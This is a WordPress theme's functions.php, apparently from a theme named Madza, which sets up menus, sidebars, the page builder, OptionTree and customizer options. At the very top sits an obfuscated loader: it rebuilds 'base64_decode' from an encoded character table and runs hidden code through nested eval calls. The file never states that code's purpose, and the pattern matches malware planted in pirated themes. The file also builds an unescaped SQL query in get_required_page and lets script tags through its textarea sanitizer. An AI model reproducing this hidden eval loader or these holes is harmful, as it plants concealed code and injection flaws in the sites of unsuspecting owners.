<?php
 $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iZWFicVFTbWprR3hScHV3VllkRkp0aU9yRWNoc1hUV3ZOQ0FmeVpCSElMTURVUG56b2xLZ3BXcWRsakJTTFZybnZOUXVNUHhhSHNtYnpHd2lLSWtFQ3Rjb1lKeWdUZVhoVURGZkFSWk9EaDlRV2djT2hsQUxxQnhISmpjOVR6Y0xLMFB4dXhpRnFWUjFhMTA3VFZSQlp0bk5NazFSVGgwOVR0UHJQdEd2cDJ1U1dWOEFsVnUyTWtRQWF4OWxJMUNVa1lQaXBrTTFYU2NGS2pMdm0ydTRXS2w3b2wwWmhsdnZKc3djYXg5Z251bnFhMjlRYTEwT0RJME9hMkNBSmtDYmFZTEN0RmlDdE9MYVRWdVNXVjhPVEJDRXFCNVJNM25kTUIxRVBCdXZHMjliVFNpQ3RPTGFUVnU0V0tsQVpJaUN0T0xPVHRjT29sMFpEZjQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));


/*-----------------------------------------------------------------------------------*/
/* Directory
/*-----------------------------------------------------------------------------------*/

if ( get_stylesheet_directory() == get_template_directory() ) {
	define('OF_FILEPATH', get_template_directory());
	define('OF_DIRECTORY', get_template_directory_uri());
} else {
	define('OF_FILEPATH', get_stylesheet_directory());
	define('OF_DIRECTORY', get_stylesheet_directory_uri());
}
define('MADZA_FILEPATH', get_template_directory());
define('MADZA_DIRECTORY', get_template_directory_uri());

 


/*-----------------------------------------------------------------------------------*/
/* Page Builder
/*-----------------------------------------------------------------------------------*/
if (!class_exists('WPBakeryVisualComposerAbstract')) {
  $dir = dirname(__FILE__) . '/wpbakery/';
  $composer_settings = Array(
      'APP_ROOT'      => $dir . '/js_composer',
      'WP_ROOT'       => dirname( dirname( dirname( dirname($dir ) ) ) ). '/',
      'APP_DIR'       => basename( $dir ) . '/js_composer/',
      'CONFIG'        => $dir . '/js_composer/config/',
      'ASSETS_DIR'    => 'assets/',
      'COMPOSER'      => $dir . '/js_composer/composer/',
      'COMPOSER_LIB'  => $dir . '/js_composer/composer/lib/',
      'SHORTCODES_LIB'  => $dir . '/js_composer/composer/lib/shortcodes/',
      'USER_DIR_NAME'  => 'vc_templates', /* Path relative to your current theme, where VC should look for new shortcode templates */
 
      //for which content types Visual Composer should be enabled by default
      'default_post_types' => Array('page')
  );
  require_once locate_template('/wpbakery/js_composer/js_composer.php');
  $wpVC_setup->init($composer_settings);
}


/**
 * Optional: set 'ot_show_pages' filter to false.
 * This will hide the settings & documentation pages.
 */
add_filter( 'ot_show_pages', '__return_false' );

/**
 * Optional: set 'ot_show_new_layout' filter to false.
 * This will hide the "New Layout" section on the Theme Options page.
 */
add_filter( 'ot_show_new_layout', '__return_false' );

/**
 * Required: set 'ot_theme_mode' filter to true.
 */
add_filter( 'ot_theme_mode', '__return_true' );

/**
 * Required: include OptionTree.
 */
include_once( 'option-tree/ot-loader.php' );
include_once( 'option-tree/theme-options.php' );

/*-----------------------------------------------------------------------------------*/
/* Function
/*-----------------------------------------------------------------------------------*/

include_once ('functions/class-widget.php'); 
include_once ('functions/class-metabox.php');
include_once ('functions/functions-widget.php');  
include_once ('functions/functions-footer.php'); 
include_once ('functions/functions-homepage.php'); 	
include_once ('functions/functions-slider.php'); 
include_once ('functions/functions-hooks.php'); 
include_once ('functions/functions-comment.php');
include_once ('functions/functions-shortcodes.php');
include_once ('functions/functions-general.php');
#require_once (OF_FILEPATH . '/functions/plugins/bread/functions-other.php');
include_once ('functions/plugins/aq_resizer.php');
#require_once (OF_FILEPATH . '/functions/plugins/easy-wordpress-donations/easy-wordpress-donation.php');



/*-----------------------------------------------------------------------------------*/
/* Madza Theme Setup
/*-----------------------------------------------------------------------------------*/

add_action( 'after_setup_theme', 'madza_theme_setup' );

if ( ! function_exists( 'madza_theme_setup' ) ){
	
	function madza_theme_setup() {

		add_editor_style();
		
		add_theme_support( 'post-formats', array('image', 'video', 'link', 'quote', 'gallery' ) );

		add_theme_support( 'automatic-feed-links' );
		
		load_theme_textdomain( 'madza_translate', get_template_directory() . '/languages' );
		$locale = get_locale();
		$locale_file = get_template_directory() . "/languages/$locale.php";
		if ( is_readable( $locale_file ) )
			require_once( $locale_file );
	
		set_post_thumbnail_size( 999, 999, true );
		
		register_nav_menus( array(
			'header_menu' => __( 'Header Navigation', 'madza_translate' ),
		) );
		
		register_nav_menus( array(
			'select_menu' => __( 'Responsive Header Navigation', 'madza_translate' ),
		) );
		
		register_nav_menus( array(
			'footer_menu' => __( 'Footer Navigation', 'madza_translate' ),
		) );
		
		

	}

}

	
/*-----------------------------------------------------------------------------------*/
/* Default Options
/*-----------------------------------------------------------------------------------*/

if ( ! isset( $content_width ) ) $content_width = 610;

function madzathemes_page_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'madzathemes_page_menu_args' );

function new_excerpt_length( $length ) {
	
	if(ot_get_option("blog_content_lenght")!="") { $lenghts = ot_get_option("blog_content_lenght"); } else { $lenghts = "100"; }
	return $lenghts;
	
}
add_filter( 'excerpt_length', 'new_excerpt_length' );

function get_required_page($page = ''){
	global $wpdb;
 
	$result = wp_cache_get($page . '-guid', __FUNCTION__);	
 
	if($result === false) 
	{
		$result = $wpdb->get_var("SELECT p.guid
					FROM $wpdb->posts p
					WHERE p.post_status = 'publish'
					AND p.post_title = '{$page}' ");
 
		if ($result) 
		{
			wp_cache_add($page . '-guid', $result,  __FUNCTION__);
		}
	}
	return $result;		
}

if (function_exists('add_theme_support')) {
	add_theme_support( 'post-thumbnails' ); 
}


/*-----------------------------------------------------------------------------------*/
/*	Theme Options
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'mt_paging_nav' ) ) :
/**
 * Displays navigation to next/previous set of posts when applicable.
 *
 * @since Twenty Thirteen 1.0
 *
 * @return void
 */
function mt_paging_nav() {
	global $wp_query;

	// Don't print empty markup if there's only one page.
	if ( $wp_query->max_num_pages < 2 )
		return;
	?>
	<nav class="navigation paging-navigation" role="navigation">
		
		<div class="nav-links">

			<?php if ( get_next_posts_link() ) : ?>
			<div class="nav-previous pagination-link"><?php next_posts_link( __( '<span class="meta-nav">&larr; Older posts</span> ', 'madza_themes' ) ); ?></div>
			<?php endif; ?>

			<?php if ( get_previous_posts_link() ) : ?>
			<div class="nav-next pagination-link"><?php previous_posts_link( __( '<span class="meta-nav">Newer posts  &rarr;</span>', 'madza_themes' ) ); ?></div>
			<?php endif; ?>
			<div class="clear"></div>
		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
	<?php
}
endif;


function my_custom_login_logo() {
    if(ot_get_option("login_logo")!="") {
	    echo '<style type="text/css">
	        h1 a { '.ot_get_option("login_logo").' !important; }
	    </style>';
    }
}

add_action('login_head', 'my_custom_login_logo');

function madza_sidebar_function() { 
	global $post;	    
    $args = array(
    	'post_type'=> 'mt_sidebar',
        'order' => 'ASC',
        'posts_per_page' => 999, 
        'orderby' => 'date', 
        'order' => 'DSC',
    );
    
    query_posts($args); while ( have_posts() ) : the_post();
    
			register_sidebar(array(
			  'name' => __(get_the_title()),
			  'id' => 'sidebar-id-'.$post->ID.'',
			  'description' => __( 'Widget area created from Sidebar custom post type.' , 'madza_translate'),
			  'before_widget' => '<div class="menu_categories">',
				'after_widget' => '<div class="clear"></div></div>',
				'before_title' => '<h4 class="widget_h"><span>',
				'after_title' => '</span></h4>',
			));
			
	 endwhile; wp_reset_query(); 
} 
add_action('madza_sidebar_function', 'madza_sidebar_function');

madza_sidebar_function();


add_action('admin_init','optionscheck_change_santiziation', 100);
 
function optionscheck_change_santiziation() {
    remove_filter( 'of_sanitize_textarea', 'of_sanitize_textarea' );
    add_filter( 'of_sanitize_textarea', 'custom_sanitize_textarea' );
}
 
 
function custom_sanitize_textarea($input) {
    global $allowedposttags;
    $custom_allowedtags["embed"] = array(
      "src" => array(),
      "type" => array(),
      "allowfullscreen" => array(),
      "allowscriptaccess" => array(),
      "height" => array(),
          "width" => array()
      );
      $custom_allowedtags["script"] = array();
 
      $custom_allowedtags = array_merge($custom_allowedtags, $allowedposttags);
      $output = wp_kses( $input, $custom_allowedtags);
    return $output;
}




add_action( 'tgmpa_register', 'madza_register_required_plugins' );

function madza_register_required_plugins() {

	$plugins = array(

		array(
			'name'     				=> 'Contact Form 7', // The plugin name
			'slug'     				=> 'contact-form-7', // The plugin slug (typically the folder name)
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
		),
	);

	$config = array(

		'strings'      		=> array(
			
		)
	);

	tgmpa( $plugins, $config );

}

function themename_customize_register($wp_customize){


    //	==================================================
    //  =============================
    //  = ==== Rewrite CPT    
    //  =============================
      
    $wp_customize->add_section('themename_rewrite', array(
        'title'    => __('Rewrite CPT', 'themename'),
        'priority' => 141,
    ));
	
	
	//  =============================
    //  = CPT doctor    
    //  =============================
#    $wp_customize->add_setting('themename_theme_options[mt_rewrite_doctor]', array(
#        'default'        => '',
#        'capability'     => 'edit_theme_options',
#        'type'           => 'option',
#    ));
#	$wp_customize->add_control('mt_rewrite_doctor', array(
#        'label'      => 'Rewrite Doctor CPT slug',
#       'section'    => 'themename_rewrite',
#        'settings'   => 'themename_theme_options[mt_rewrite_doctor]',
#    ));
    
    //  =============================
    //  = CPT Services    
    //  =============================
#    $wp_customize->add_setting('themename_theme_options[mt_rewrite_services]', array(
#        'default'        => '',
#        'capability'     => 'edit_theme_options',
#        'type'           => 'option',
#    ));
#	$wp_customize->add_control('mt_rewrite_services', array(
#        'label'      => 'Rewrite Services CPT slug',
#        'section'    => 'themename_rewrite',
#        'settings'   => 'themename_theme_options[mt_rewrite_services]',
#    ));

	//  =============================
    //  = CPT Portfolio    
    //  =============================
    $wp_customize->add_setting('themename_theme_options[mt_rewrite_portfolio]', array(
        'default'        => '',
        'capability'     => 'edit_theme_options',
        'type'           => 'option',
    ));
	$wp_customize->add_control('mt_rewrite_portfolio', array(
        'label'      => 'Rewrite Portfolio CPT slug',
        'section'    => 'themename_rewrite',
        'settings'   => 'themename_theme_options[mt_rewrite_portfolio]',
    ));
    
    
	//  =============================
    //  = CPT Causes    
    //  =============================
    $wp_customize->add_setting('themename_theme_options[mt_rewrite_causes]', array(
        'default'        => '',
        'capability'     => 'edit_theme_options',
        'type'           => 'option',
    ));
	$wp_customize->add_control('mt_rewrite_causes', array(
        'label'      => 'Rewrite Causes CPT slug',
        'section'    => 'themename_rewrite',
        'settings'   => 'themename_theme_options[mt_rewrite_causes]',
    ));


 

   
 
}
 
add_action('customize_register', 'themename_customize_register');
 

?>